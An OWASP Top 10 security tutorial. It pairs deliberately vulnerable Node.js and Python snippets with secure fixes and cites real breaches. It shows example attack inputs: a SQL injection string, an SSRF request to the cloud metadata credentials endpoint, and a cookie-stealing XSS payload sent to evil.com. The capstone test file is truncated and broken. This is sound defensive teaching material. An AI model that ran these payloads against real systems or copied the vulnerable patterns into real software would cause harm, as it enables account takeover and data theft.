Security Track

OWASP Top 10

The OWASP Top 10 is the world's most authoritative list of the most critical web application security risks. Every backend, frontend, DevOps, and full-stack engineer should understand these vulnerabilities because the same mistakes keep costing real companies real money — and real user trust.

In this tutorial you will learn each risk with concrete code examples, famous real-world breaches, and practical defenses you can implement immediately in Node.js, Python, SQL, Docker, and CI/CD pipelines.

What Is OWASP?

OWASP stands for the Open Worldwide Application Security Project . It is a nonprofit foundation that produces free, open-source security standards, tools, and documentation. The OWASP Top 10 is updated every few years by a global team of security researchers based on real production data.

Rank Risk (2021) One-line summary
A01 Broken Access Control Users can act outside their intended permissions.
A02 Cryptographic Failures Sensitive data is exposed or stored/transmitted without protection.
A03 Injection Untrusted data is sent to an interpreter as part of a command or query.
A04 Insecure Design The application architecture itself lacks security controls.
A05 Security Misconfiguration Default settings, missing patches, or verbose errors leak data.
A06 Vulnerable and Outdated Components Libraries, frameworks, or OS packages with known CVEs.
A07 Authentication Failures Weak login flows let attackers impersonate users.
A08 Software and Data Integrity Failures Untrusted updates, deserialization, or CI/CD tampering.
A09 Logging & Monitoring Failures Security events go unnoticed because logs are missing or ignored.
A10 Server-Side Request Forgery (SSRF) The server fetches a URL supplied by the user without validation.

A01: Broken Access Control

Access control enforces rules like "users can only see their own orders." When that enforcement is missing, attackers can read or modify other users' data simply by changing an ID in a URL or API request.

Real-world example

In 2019, a Facebook bug let users see other people's private Messenger chats because a server-side access check was missing when fetching message threads by ID. An attacker only needed to increment a numeric ID.

Vulnerable code 

// ❌ VULNERABLE: trusts the client-supplied userId
app.get("/api/orders/:id", async (req, res) => {
  const order = await db.query("SELECT * FROM orders WHERE id = $1", [
    req.params.id,
  ]);
  res.json(order);
});

Secure code 

// ✅ SECURE: enforce ownership server-side
app.get("/api/orders/:id", authenticate, async (req, res) => {
  const order = await db.query(
    "SELECT * FROM orders WHERE id = $1 AND user_id = $2",
    [req.params.id, req.user.id],
  );
  if (!order.rows[0]) return res.status(404).json({ error: "Not found" });
  res.json(order.rows[0]);
});
  • Deny by default; allow access only after explicit authorization checks.
  • Never trust the URL alone. Always re-check ownership on every request.
  • Use role-based access control (RBAC) for admin vs. user capabilities.
  • Log access-control failures and alert on repeated attempts.

A02: Cryptographic Failures

This category covers transmitting or storing sensitive data in cleartext, using weak or deprecated algorithms, or mishandling encryption keys. It is the modern name for what used to be called "Sensitive Data Exposure."

Real-world example

Equifax's 2017 breach exposed 147 million records partly because attackers found unencrypted personal data after exploiting an outdated Apache Struts library. Storing data in cleartext magnified the impact.

Wrong: cleartext storage and weak hashing 

# ❌ VULNERABLE
def store_user(email, password, ssn):
    db.execute(
        "INSERT INTO users (email, password, ssn) VALUES (?, ?, ?)",
        (email, password, ssn),
    )
# Password = 'password123' stored literally.

Right: hashing, encryption, TLS 

# ✅ SECURE
import bcrypt
from cryptography.fernet import Fernet
SECRET_KEY = Fernet.generate_key()
fernet = Fernet(SECRET_KEY)
def store_user(email, password, ssn):
    hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12)).decode()
    encrypted_ssn = fernet.encrypt(ssn.encode()).decode()
    db.execute(
        "INSERT INTO users (email, password_hash, ssn_encrypted) VALUES (?, ?, ?)",
        (email, hashed, encrypted_ssn),
    )
  • Use TLS 1.2+ everywhere (HTTPS, database connections, internal service calls).
  • Hash passwords with bcrypt/Argon2/scrypt — never MD5 or SHA1 alone.
  • Encrypt PII at rest; keep keys in a KMS, not in source code.
  • Disable caching for pages containing sensitive data with cache-control headers.

A03: Injection

Injection happens when an application passes untrusted input directly into a command, query, or template. SQL injection is the most famous form, but NoSQL, OS command, LDAP, and template injection are also common.

Real-world example

In 2008, Heartland Payment Systems lost 130 million card numbers after attackers used SQL injection against a web application and planted sniffers on the network. It was one of the costliest breaches in history.

Vulnerable SQL 

// ❌ VULNERABLE: string concatenation
app.get("/api/users", async (req, res) => {
  const q = req.query.name;
  const result = await db.query(`SELECT * FROM users WHERE name = '${q}'`);
  res.json(result.rows);
});
// Attacker sends: name=' OR '1'='1
// Result returns every user in the database.

Secure SQL with parameterized queries 

// ✅ SECURE: parameters are bound, never interpreted
app.get("/api/users", async (req, res) => {
  const result = await db.query("SELECT * FROM users WHERE name = $1", [
    req.query.name,
  ]);
  res.json(result.rows);
});

Secure ORM example 

# ✅ SECURE with SQLAlchemy ORM
from sqlalchemy import select
from models import User
@app.get("/api/users")
def search_users(name: str):
    stmt = select(User).where(User.name == name)
    return session.execute(stmt).scalars().all()
  • Always use parameterized queries or ORM parameter binding.
  • Validate, sanitize, and whitelist input on the server.
  • Use the principle of least privilege for database accounts.
  • Avoid passing user input to shell commands or eval().

A04: Insecure Design

Insecure design is a broad category for missing or ineffective security controls in the application design itself. It is not a bug in a single line — it is a flaw in how the feature was conceived.

Real-world example

In 2022, several ride-sharing apps let users sign up with fake driver accounts because the design allowed the same API to both register a driver and approve that driver. There was no separation between data entry and business approval.

Insecure design: price sent from client 

// ❌ VULNERABLE: the client sets the total
app.post("/api/checkout", async (req, res) => {
  const { items, total } = req.body;
  await chargeCard(req.user.cardToken, total); // $0.01 if attacker wants
  await db.query("INSERT INTO orders ...", [items, total]);
  res.json({ ok: true });
});

Secure design: server re-calculates price 

// ✅ SECURE: authoritative price comes from the database
app.post("/api/checkout", authenticate, rateLimit, async (req, res) => {
  const items = await validateCartItems(req.body.itemIds); // fetch real SKUs & prices
  const total = items.reduce((sum, i) => sum + i.price * i.qty, 0);
  if (Math.abs(total - req.body.clientTotal) > 0.01) {
    return res.status(400).json({ error: "Price mismatch" });
  }
  await chargeCard(req.user.cardToken, total);
  await db.query("INSERT INTO orders ...", [items, total]);
  res.json({ orderId });
});
  • Treat client-submitted values as untrusted hints, never authoritative facts.
  • Use threat modeling (STRIDE) before building high-risk features.
  • Add business limits and rate limits by design, not as afterthoughts.
  • Separate sensitive workflows (e.g., write approval vs. read access).

A05: Security Misconfiguration

This category covers default passwords, open cloud buckets, unnecessary features enabled, verbose error messages, missing security headers, and unpatched software. It is one of the easiest vulnerabilities to exploit.

Real-world example

Capital One's 2019 breach affected 100 million customers when a misconfigured AWS WAF/SSRF chain let an attacker list S3 buckets. A single firewall rule gap plus a metadata service issue opened the door.

Express without security headers 

// ❌ VULNERABLE: default headers and stack traces
const app = require("express")();
app.get("/api/error", (req, res) => {
  throw new Error(req.query.msg);
});
// Stack trace + SQL details leak to the browser.

Secure Express setup 

// ✅ SECURE
const express = require("express");
const helmet = require("helmet");
const app = express();
app.use(
  helmet({
    contentSecurityPolicy: {
      directives: { defaultSrc: ["'self'"], scriptSrc: ["'self'"] },
    },
    hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },
  }),
);
app.use((err, req, res, next) => {
  console.error(err);
  res.status(500).json({ error: "Internal server error" }); // no stack trace
});

Docker hardening example 

# ✅ SECURE Dockerfile habits
FROM node:20-alpine
RUN addgroup -g 1001 -S appgroup && adduser -u 1001 -S appuser -G appgroup
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production
COPY . .
USER appuser
EXPOSE 3000
CMD ["node", "server.js"]
  • Remove default accounts, sample apps, and unused features.
  • Send security headers (Helmet, CSP, HSTS, X-Content-Type-Options).
  • Return generic error messages in production; log details server-side.
  • Run containers as non-root and keep images minimal.

A06: Vulnerable and Outdated Components

Most applications depend on hundreds of open-source packages. When one has a known vulnerability and is not updated, attackers can exploit it before developers even realize the risk.

Real-world example

The 2017 Equifax breach began with a known remote-code-execution vulnerability in Apache Struts (CVE-2017-5638). A patch had been available for months, but the component had not been updated.

Scan and patch dependencies 

# ✅ Node.js dependency audit
npm audit
npm audit fix
# Break the build on critical vulnerabilities
npm audit --audit-level=moderate
# Python
pip-audit
safety check
# Container images
snyk container test myapp:latest

Dependabot / CI pipeline 

# .github/workflows/security.yml
name: Security Scan
on: [push, pull_request]
jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
      - run: npm ci
      - run: npm audit --audit-level=moderate
      - run: npx eslint . --ext .js,.ts
      - uses: github/codeql-action/init@v3
      - uses: github/codeql-action/analyze@v3
  • Maintain a software bill of materials (SBOM) for every service.
  • Enable Dependabot, Renovate, or Snyk for automatic update PRs.
  • Remove unused dependencies — they still show up in scans and attack surface.
  • Pin to exact versions in production and verify checksums.

A07: Authentication Failures

Authentication failures cover weak password rules, brute-forceable login forms, weak session tokens, missing MFA, and insecure password recovery. If an attacker can log in as someone else, every other control can fail.

Real-world example

In 2020, Twitter's admin panel was compromised through a phone-based social-engineering attack that bypassed MFA. While MFA is not invincible, the incident showed how critical authentication flows are to platform integrity.

Brute-forceable login 

// ❌ VULNERABLE: no rate limiting or lockout
app.post("/api/login", async (req, res) => {
  const user = await db.query("SELECT * FROM users WHERE email = $1", [
    req.body.email,
  ]);
  if (await bcrypt.compare(req.body.password, user.password_hash)) {
    return res.json({ token: jwt.sign({ sub: user.id }, SECRET) });
  }
  res.status(401).json({ error: "Bad credentials" });
});

Secure login with rate limiting and MFA hooks 

// ✅ SECURE
const rateLimit = require("express-rate-limit");
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  standardHeaders: true,
  message: { error: "Too many attempts. Try again later." },
});
app.post("/api/login", loginLimiter, async (req, res) => {
  const user = await db.query("SELECT * FROM users WHERE email = $1", [
    req.body.email,
  ]);
  if (!user || !(await bcrypt.compare(req.body.password, user.password_hash))) {
    await logFailedLogin(req.body.email, req.ip);
    return res.status(401).json({ error: "Invalid credentials" });
  }
  if (user.mfaEnabled) {
    return res.json({ step: "mfa", tempToken: issueTempToken(user.id) });
  }
  res.json({ token: issueJwt(user) });
});
  • Enforce strong passwords and offer MFA (TOTP, WebAuthn, or passkeys).
  • Rate-limit login, registration, and password-reset endpoints.
  • Use short-lived JWTs, secure httpOnly cookies, and rotate secrets.
  • Never expose whether an email is registered through error messages.

A08: Software & Data Integrity Failures

Integrity failures occur when applications rely on plugins, libraries, or data from untrusted sources without verification. The SolarWinds attack is the textbook example of a supply-chain integrity failure.

Real-world example

The 2020 SolarWinds Orion breach showed how dangerous a compromised software update can be. Attackers inserted malicious code into a signed build that was distributed to 18,000 organizations, including government agencies.

Unsafe deserialization in Python 

# ❌ VULNERABLE: pickle can execute arbitrary code during loading
import pickle
def load_user_session(data):
    return pickle.loads(data)  # attacker sends a malicious payload

Safe alternative: signed JSON or protobuf 

# ✅ SECURE: JSON + HMAC signature
import json
import hmac
import hashlib
SECRET = b"your-256-bit-key"
def sign(data: bytes) -> str:
    return hmac.new(SECRET, data, hashlib.sha256).hexdigest()
def load_user_session(signed_data: str) -> dict:
    signature, payload = signed_data.split(":", 1)
    if not hmac.compare_digest(signature, sign(payload.encode())):
        raise ValueError("Invalid signature")
    return json.loads(payload)
  • Never deserialize untrusted data with pickle, eval, or similar mechanisms.
  • Sign and verify all software updates, Docker images, and config artifacts.
  • Use SRI (subresource integrity) hashes for CDN-loaded JavaScript.
  • Review CI/CD pipeline permissions and require signed commits for releases.

A09: Logging & Monitoring Failures

Without good logs, a breach can continue for months. This category covers missing logs, logs that leak secrets, and teams that do not act on alerts.

Real-world example

Marriott's 2018 breach lasted four years before discovery. Attackers had been inside the Starwood systems since 2014 because security monitoring and incident response were inadequate.

What to log (and not log) 

// ✅ SECURE structured logging example
const winston = require("winston");
const logger = winston.createLogger({
  level: "info",
  format: winston.format.json(),
  transports: [new winston.transports.Console()],
});
function logLogin(email, success, ip) {
  logger.info({
    event: "login_attempt",
    user: email,
    success,
    ip,
    timestamp: new Date().toISOString(),
    // ❌ Never log req.body.password here
  });
}
  • Log authentication, authorization, data changes, and admin actions.
  • Never log passwords, tokens, credit cards, or full PII.
  • Forward logs to a central SIEM and set alerts on anomalies.
  • Practice incident response drills so teams know the playbook.

A10: Server-Side Request Forgery (SSRF)

SSRF happens when a server makes an HTTP request to a URL supplied by a user, and the attacker uses that capability to reach internal services, cloud metadata endpoints, or restricted networks.

Real-world example

The 2019 Capital One breach is one of the largest SSRF cases: a misconfigured WAF let the attacker request AWS metadata service URLs, obtain IAM credentials, and list S3 buckets containing 100 million customer records.

Vulnerable URL fetch 

// ❌ VULNERABLE: fetch any URL the user provides
app.post("/api/fetch-metadata", async (req, res) => {
  const { url } = req.body;
  const response = await fetch(url);
  const text = await response.text();
  res.json({ data: text });
});
// Attacker sends url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

Safe URL fetch with allow-list and DNS resolution check 

// ✅ SECURE
const { URL } = require("url");
const dns = require("dns").promises;
const ALLOWED_HOSTS = ["api.example.com", "hooks.example.com"];
async function safeFetch(userUrl) {
  let parsed;
  try {
    parsed = new URL(userUrl);
  } catch {
    throw new Error("Invalid URL");
  }
  if (!["http:", "https:"].includes(parsed.protocol)) {
    throw new Error("Protocol not allowed");
  }
  if (!ALLOWED_HOSTS.includes(parsed.hostname)) {
    throw new Error("Host not allowed");
  }
  const addresses = await dns.resolve(parsed.hostname);
  for (const ip of addresses) {
    if (isPrivateIP(ip)) throw new Error("Private IP blocked");
  }
  return fetch(userUrl);
}
  • Use strict allow-lists for outbound URLs, not blocklists.
  • Block private IP ranges and cloud metadata endpoints.
  • Run fetch services in isolated networks with no access to internal APIs.
  • Disable unused URL fetching features.

Secure SDLC Habits

Treating security as a final checklist guarantees repeated breaches. The best teams embed security into every phase of the software development lifecycle (SDLC).

Requirements

Define what must be protected: PII, payment data, admin functions, third-party integrations.

Design

Threat model with STRIDE. Draw trust boundaries. Ask "what if an attacker controls the client?"

Code

Use safe APIs, linters (eslint-security, bandit), code review checklists, and pair reviews for risky changes.

Test

SAST, DAST, dependency scanning, fuzzing, and OWASP ZAP baseline scans in CI.

Deploy

Sign artifacts, scan images, rotate secrets, and enforce security headers and TLS.

Operate

Centralized logging, anomaly alerts, incident response playbooks, and regular penetration tests.

More Real-World Breaches by Risk

OWASP categories are not abstract checkboxes — they appear in headline breaches repeatedly. Studying real cases helps you recognize the same patterns in your own code and infrastructure.

A01: Uber (2016)

Attackers found credentials in a private GitHub repo, then used them to access an internal AWS dashboard without proper access controls, exposing 57 million users.

A02: LinkedIn (2012)

167 million password hashes were stolen. Because SHA1 without salt was used, attackers cracked millions within hours and sold the list online.

A03: TalkTalk (2015)

A simple SQL injection in a legacy webpage gave attackers access to 157,000 customer records and cost the company £77 million.

A04: First American Financial (2019)

Insecure direct object reference in a document viewer let anyone change a numeric ID to view 885 million sensitive financial records.

A05: Microsoft Power Apps (2021)

Misconfigured OData APIs exposed 38 million records from government agencies and private companies because default sharing settings were too permissive.

A06: Log4Shell (CVE-2021-44228)

A single vulnerable Log4j logging call in millions of Java applications allowed remote code execution worldwide within days of disclosure.

A07: Yahoo (2013–2014)

Weak hashing (MD5) and no MFA for internal accounts contributed to the compromise of 3 billion accounts, reducing Yahoo's sale price by $350 million.

A08: Codecov Bash Uploader (2021)

Attackers compromised a CI script used by thousands of companies. Because the script was not signed, malicious code was distributed for two months.

A09: Target (2013)

Alert tools detected the breach but were ignored because of alert fatigue. 40 million credit cards were stolen before the intrusion was contained.

A10: Capital One (2019)

SSRF through a misconfigured WAF allowed access to AWS IAM credentials, leading to the theft of 100 million customer records.

Risks Beyond the Top 10

The OWASP Top 10 is a starting point, not a complete catalog. Production systems also face these threats:

Cross-Site Scripting (XSS)

XSS allows attackers to inject JavaScript into pages other users view. Stored XSS led to the 2018 British Airways breach where attackers skimmed 380,000 payment cards through a compromised script. 

// ❌ VULNERABLE: reflects user input without escaping
app.get("/search", (req, res) => {
  res.send(`Results for: ${req.query.q}`);
});
// Attacker sends: q=fetch('https://evil.com?cookie='+document.cookie)
// ✅ SECURE: escape output or use a framework that auto-escapes
const escapeHtml = require("escape-html");
app.get("/search", (req, res) => {
  res.send(`Results for: ${escapeHtml(req.query.q)}`);
});

Cross-Site Request Forgery (CSRF)

CSRF tricks a logged-in user's browser into performing unwanted actions. A 2008 uTorrent CSRF flaw let attackers change settings by getting users to visit a malicious page. 

// ✅ SECURE: csurf middleware + SameSite cookies
const csrf = require("csurf");
const csrfProtection = csrf({ cookie: { httpOnly: true, sameSite: "strict" } });
app.post("/api/transfer", csrfProtection, authenticate, (req, res) => {
  // process transfer
});

Insecure Direct Object References (IDOR)

IDOR is a specific access-control failure where an attacker manipulates a reference (invoice ID, file path, user ID) to access unauthorized resources. It featured in the 2019 First American Financial breach. 

# ❌ VULNERABLE: /api/documents/123 -> attacker tries /api/documents/124
@app.get("/api/documents/{doc_id}")
def get_document(doc_id: int):
    return db.get_document(doc_id)
# ✅ SECURE: check ownership
def get_document(user: User, doc_id: int):
    doc = db.query(
        "SELECT * FROM documents WHERE id = ? AND owner_id = ?", (doc_id, user.id)
    )
    if not doc:
        raise HTTPException(status_code=404)
    return doc

Business Logic Flaws

Business logic flaws let attackers abuse legitimate workflows. In 2016, Uber had a flaw that let users book rides with a negative payment method, effectively earning money from the company.

API Security

APIs often expose more data than web pages because they are not visually constrained. The 2018 T-Mobile API breach exposed personal data of 2 million customers through an unauthenticated endpoint. 

// ✅ SECURE: enforce auth, rate limits, and response filtering on every API route
app.use("/api", authenticate);
app.use("/api", rateLimit({ windowMs: 15 * 60 * 1000, max: 100 }));
app.get("/api/users/:id", async (req, res) => {
  const user = await db.findById(req.params.id);
  res.json({
    id: user.id,
    name: user.name,
    // ❌ Do not return: email, ssn, password_hash, internal_notes
  });
});

Secrets in Source Code

Hard-coded API keys and database passwords are found in public repositories daily. GitHub scans for leaked secrets, but prevention is better than detection. 

# ✅ SECURE secrets management
# Use environment variables, never commit keys
export DATABASE_URL="$(aws secretsmanager get-secret-value --secret-id prod/db)"
# Scan for secrets before pushing
git-secrets --scan
pre-commit run --all-files

Capstone Project: Harden a Small E-Commerce API

1. What is this project?

You will take a deliberately insecure Node.js/Express e-commerce API and apply defenses for every OWASP Top 10 risk. The starter intentionally contains multiple vulnerabilities so you can practice finding and fixing them.

2. What it covers

  • Broken access control: enforce order ownership and admin RBAC.
  • Cryptographic failures: hash passwords, encrypt PII, enforce TLS, set secure cookies.
  • Injection: convert all raw SQL to parameterized queries; add input validation.
  • Insecure design: recalculate prices server-side, add inventory checks, and rate-limit checkout.
  • Security misconfiguration: Helmet headers, generic errors, non-root Docker user, minimal image.
  • Vulnerable components: audit dependencies, remove unused packages, add Dependabot.
  • Authentication failures: rate-limit login, add TOTP MFA, secure password reset.
  • Integrity failures: sign session cookies with HMAC, verify Docker image digests, SRI for CDN assets.
  • Logging failures: structured JSON logs, SIEM forwarding, redact secrets, alert thresholds.
  • SSRF: block metadata endpoints, restrict outbound webhooks to an allow-list, DNS resolution checks.

3. How it is done

Step 1 — start from the vulnerable starter: 

// src/server.js — intentionally insecure
const express = require("express");
const app = express();
app.use(express.json());
app.get("/api/orders/:id", async (req, res) => {
  const order = await db.query(
    `SELECT * FROM orders WHERE id = ${req.params.id}`,
  );
  res.json(order.rows[0]);
});
app.post("/api/checkout", (req, res) => {
  chargeCard(req.user.card, req.body.total);
  res.json({ ok: true });
});
app.post("/api/webhooks/fetch", async (req, res) => {
  const response = await fetch(req.body.url);
  res.json({ body: await response.text() });
});
app.listen(3000);

Step 2 — apply security hardening in this order:

  1. Add Helmet, CORS, and a generic error handler that hides stack traces.
  2. Replace every string-interpolated query with parameter binding.
  3. Enforce order ownership in the database WHERE clause and add an admin-only middleware.
  4. Re-calculate cart totals from a trusted price catalog; reject mismatches.
  5. Add express-rate-limit on auth and checkout routes; require CAPTCHA after repeated failures.
  6. Run npm audit, remove unused packages, pin exact versions, enable Dependabot.
  7. Add bcrypt password hashing, TOTP MFA, secure httpOnly cookies, and password reset tokens.
  8. Sign session cookies with HMAC; verify Docker image digests in CI; add SRI for CDN assets.
  9. Add structured JSON logging and alert on failed admin logins, large money movements, and SSRF attempts.
  10. Validate webhook URLs against an allow-list, resolve DNS, and block private IPs and metadata endpoints.

Step 3 — example test that must pass after hardening: 

// tests/access-control.test.js
const request = require("supertest");
const app = require("../src/server");
describe("access control", () => {

      .get("/api/orders/999") // order belonging to Bob

  it("rejects checkout when client total does not match server total", async () => {
    const bob = await login("bob@example.com", "password");

      .post("/api/checkout")
      .set("Authorization", `Bearer ${bob.token}`)
      .send({ itemIds: [1, 2], clientTotal: 0.01 });
    expect(res.status).toBe(400);

4. What did we learn from this capstone project?

Security is not a single feature; it is a property of the whole system. One missing check in an access-control rule, one unparameterized query, or one unvalidated URL can undermine months of good engineering. The capstone shows how the OWASP Top 10 risks interconnect in a real application and how defenses reinforce each other. Fixing one category often helps another: parameterized queries prevent injection and reduce the blast radius of access-control mistakes; logging makes misconfigurations and attacks visible; and CI scanning keeps vulnerable components from reaching production.

5. How can I enhance this project in the future?

  • Add OWASP ZAP automated baseline scans in GitHub Actions and fail the build on new alerts.
  • Implement WebAuthn/Passkey authentication instead of passwords.
  • Add a bug-bounty-style capture-the-flag challenge with hidden flags for each risk.
  • Build a security dashboard that visualizes failed logins, dependency CVEs, and alert trends.
  • Integrate with an open-source SIEM (Wazuh or Elastic SIEM) and write detection rules.
  • Add a CSP report-uri endpoint and review violation reports weekly.
  • Run a tabletop incident-response exercise using the logs from this app.
